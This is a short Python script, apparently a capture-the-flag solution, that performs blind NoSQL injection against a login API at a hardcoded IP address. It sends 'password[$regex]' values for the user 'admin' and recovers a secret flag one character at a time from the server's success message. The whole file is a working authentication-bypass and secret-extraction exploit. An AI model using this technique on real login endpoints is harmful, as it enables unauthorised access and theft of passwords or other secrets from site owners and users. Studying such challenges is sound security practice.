import requests
import string

flag = "knox{"
url = "http://143.110.241.135:9000/api/login"

restart = True

while restart:
    restart = False
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data)

        if b"You can proceed!! Welcome!!" in r.content:
            print(payload)
            restart = True
            flag = payload
            if i == "}":
                print("\nFlag: " + flag)
                exit(0)
            break
